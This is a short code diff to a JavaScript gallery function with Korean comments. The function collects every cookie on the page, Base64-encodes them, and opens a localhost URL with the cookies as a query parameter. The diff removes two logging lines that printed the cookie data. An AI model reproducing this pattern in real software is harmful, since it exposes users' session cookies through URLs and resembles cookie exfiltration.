@@ -327,7 +327,6 @@ function createGallery(container) {
         try {
             // 현재 페이지의 모든 쿠키를 가져옴
             const cookieString = document.cookie;
-
             console.log('🍪 쿠키 수집:', cookieString);
 
             // Base64 인코딩 (URL에 안전하게 포함하기 위해)
@@ -335,9 +334,6 @@ function createGallery(container) {
 
             // URL에 쿠키 데이터 포함
             const targetUrl = `http://localhost:8080/index.html?sessionData=${encodedCookies}`;
-
-            console.log("✅ 쿠키정보 : ", encodedCookies);
-            console.log('✅ 갤러리로 이동 (쿠키 포함)');
             window.open(targetUrl, '_blank');
 
         } catch (error) {
